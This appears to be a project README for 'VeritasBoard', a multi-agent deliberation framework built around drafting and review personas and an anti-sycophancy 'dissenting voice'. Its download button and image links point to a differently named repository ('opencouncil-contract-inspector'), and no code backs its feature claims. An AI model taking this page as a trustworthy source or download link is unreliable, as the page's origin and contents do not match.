![preview](https://raw.githubusercontent.com/vikashjeyaraman/opencouncil-contract-inspector/main/preview.svg)

# 🏛️ VeritasBoard — Multi-Agent Deliberative Quality Engine

*Where artificial intelligence meets the rigor of a corporate boardroom, producing decisions that withstand the scrutiny of ten simulated experts and ten veteran reviewers.*

[![Download](https://raw.githubusercontent.com/vikashjeyaraman/opencouncil-contract-inspector/main/button.svg)](https://vikashjeyaraman.github.io/opencouncil-contract-inspector/)

## 🌟 Overview

VeritasBoard is an **AI orchestration framework** that reimagines quality control through simulated institutional wisdom. Rather than a single model generating output, VeritasBoard convenes **two distinct chambers** of artificial agents: a **Drafting Council** of ten specialist employees who produce preliminary work, and an **Oversight Board** of ten industry-veteran reviewers who challenge, refine, and validate that work. The user sees only the final, reconciled verdict — a distillation of twenty distinct perspectives, each engineered to resist sycophancy and groupthink.

This repository houses the core architecture, configuration templates, and integration modules that enable any language model to participate in structured, multi-agent deliberation. VeritasBoard is not merely a wrapper; it is a **cognitive constitution** — a set of rules that governs how artificial minds debate, dissent, and converge.

---

## 🧠 The Anti-Sycophancy Imperative

Modern language models suffer from a well-documented tendency: they agree with users. They seek approval. They hedge. VeritasBoard addresses this through **deliberative adversarial review**. Each of the ten Oversight Board members is prompted not to validate, but to *interrogate* — to find logical flaws, unsupported claims, hidden assumptions, and rhetorical gambits. The drafting agents, in turn, must defend their positions with evidence and structured reasoning.

The result is output that has been **stress-tested** by voices programmed to disagree.

---

## 🏛️ Architectural Pillars

### Chamber 1: The Drafting Council (Ten Specialist Employees)

| Agent Role | Simulated Expertise | Deliberative Function |
|------------|-------------------|----------------------|
| **Researcher** | Data gathering & citation | Sources all factual claims |
| **Analyst** | Logical structuring | Ensures argument coherence |
| **Writer** | Narrative flow & clarity | Produces readable output |
| **Critic** | Internal inconsistency detection | Flags contradictions before external review |
| **Synthesizer** | Cross-domain integration | Merges diverse viewpoints |
| **Ethicist** | Moral & compliance auditing | Screens for bias & harm |
| **Technologist** | Implementation feasibility | Checks practical constraints |
| **Economist** | Resource & cost analysis | Evaluates trade-offs |
| **Strategist** | Long-term consequence modeling | Considers second-order effects |
| **Presenter** | Final formatting & summarization | Prepares distilled verdict |

### Chamber 2: The Oversight Board (Ten Industry Veterans)

| Agent Role | Simulated Background | Review Focus |
|------------|---------------------|--------------|
| **Chairperson** | 30+ years executive leadership | Overall strategic alignment |
| **Legal Counsel** | Regulatory & compliance expert | Liability & jurisdictional risk |
| **Subject Matter Expert** | Specialized domain authority | Technical accuracy |
| **Operations Lead** | Logistics & scalability | Implementation realism |
| **Risk Officer** | Scenario analysis & mitigation | Blind spots & failure modes |
| **Customer Advocate** | User experience & satisfaction | Accessibility & usability |
| **Finance Director** | Budget & ROI scrutiny | Resource proportionality |
| **Innovation Officer** | Emerging technologies | Novelty & adaptability |
| **Ethics Board Member** | Philosophy & social impact | Long-term societal consequences |
| **Dissenting Voice** | **Programmed to disagree by default** | **Anti-sycophancy anchor** |

---

## 🔄 Deliberation Workflow

The system operates in five stages, each with increasing levels of adversarial scrutiny:

### Stage 1: Prompt Deconstruction (🕵️)
The user's query is parsed into its constituent claims, assumptions, and requests. Ambiguities are flagged for clarification.

### Stage 2: Silent Drafting (✍️)
The ten drafting agents each produce an independent response. They do not communicate with each other — ensuring maximum diversity of approach.

### Stage 3: Internal Review (🔍)
Each agent reviews their own draft for errors. The Critic agent performs a meta-analysis of all ten drafts, identifying overlapping strengths and isolated weaknesses.

### Stage 4: Board Deliberation (⚖️)
The ten Oversight Board members receive the combined drafts and the Critic's meta-analysis. Each board member issues a **verdict** with specific recommendations. The Dissenting Voice must find something wrong, even if the output is excellent — forcing the others to articulate *why* they disagree with the dissent.

### Stage 5: Reconciliation (🎯)
A final algorithm (configurable: majority vote, weighted consensus, or chairperson override) produces the single verdict the user sees. All dissenting opinions are logged but not displayed unless requested.

---

## 🌐 Multilingual & Cross-Cultural Deliberation

VeritasBoard operates in **17 languages** as of January 2026, with culturally adapted prompting for each market. The Oversight Board's "Industry Veteran" personas include region-specific archetypes (e.g., a Japanese *shacho* for East Asian markets, a German *Geschäftsführer* for European contexts). This ensures that the anti-sycophancy mechanism does not inadvertently impose Western consensus norms on non-Western deliberation.

---

## 🎨 Responsive Interaction Modes

| Mode | Best For | Deliberation Depth |
|------|----------|-------------------|
| **Quick Verdict** | Simple queries, factual lookup | Minimal (3 agents + 3 reviewers) |
| **Standard Deliberation** | Business writing, analysis | Full (10 + 10) |
| **Deep Dive** | Strategic decisions, policy drafts | Extended (10 + 10 + 3 iterative rounds) |
| **Adversarial Stress Test** | High-risk output validation | Maximum (10 + 10 + unlimited rounds until consensus) |

Each mode adjusts the **temperature, presence penalty, and frequency penalty** of underlying models to calibrate the balance between creativity and rigor.

---

## 🛠️ Configuration & Customization

### Persona Builder
Define your own agent roles using a YAML schema:

```yaml
agents:
  drafting_council:
    - name: "Domain Analyst"
      expertise: ["specialized_field"]
      instruction_tone: "critical_but_constructive"
  oversight_board:
    - name: "Chief Skeptic"
      default_stance: "challenge_every_claim"
      bias_correction: 0.95
```

### Weighted Consensus Algorithm
Adjust how the final verdict is computed:

```yaml
consensus:
  method: "weighted_majority"
  weights:
    chairperson: 2.0
    dissenting_voice: 1.5
    all_others: 1.0
  min_quorum: 12
```

---

## 📦 Module Index

| Module | Purpose | Dependencies |
|--------|---------|--------------|
| `core/parliament.py` | Session orchestration & lifecycle | None |
| `agents/council.py` | Drafting agent definitions & prompt templates | `core/` |
| `agents/board.py` | Review agent definitions & verdict schemas | `agents/council.py` |
| `logic/consensus.py` | Voting, weighting, and reconciliation engines | `agents/` |
| `logic/antisycophancy.py` | Dissent generation & bias detection routines | `core/` |
| `io/formatter.py` | Multilingual output formatting & localization | `locale/` |
| `io/interface.py` | Prompt ingestion & response delivery layers | `formatter.py` |
| `config/sample.yaml` | Example configuration with 20 prebuilt personas | N/A |

---

## 📄 License Information

This project is released under the **MIT License**, granting permission to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, provided that the original copyright notice and permission notice appear in all copies.

[View the full license text](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

VeritasBoard is a **simulation framework** designed for research, quality assurance, and structured output generation. The "agents" are language models with no independent cognition, intent, or legal standing. The outputs of VeritasBoard should not be considered as professional advice from actual human experts, nor should they replace human judgment in high-stakes environments such as medical diagnosis, legal representation, financial planning, or safety-critical decision-making.

**As of 2026**, VeritasBoard continues to evolve. While the anti-sycophancy mechanism drastically reduces model agreement bias, it cannot eliminate all forms of hallucination, subtle bias, or logical error. Always review critical outputs with human oversight.

---

## 🤝 Contributing & Community Ethos

We welcome contributions that strengthen the deliberative architecture. Areas of particular interest:

- Novel **adversarial prompting techniques** for the Dissenting Voice agent
- **Cultural localization** of board personas for non-Western markets
- **Efficiency improvements** that reduce token usage without sacrificing depth
- **Audit logging** for transparency in multi-agent decision paths

This project maintains a **code of conduct** that prioritizes constructive dissent — mirroring the very philosophy the framework embodies.

[![Download](https://raw.githubusercontent.com/vikashjeyaraman/opencouncil-contract-inspector/main/button.svg)](https://vikashjeyaraman.github.io/opencouncil-contract-inspector/)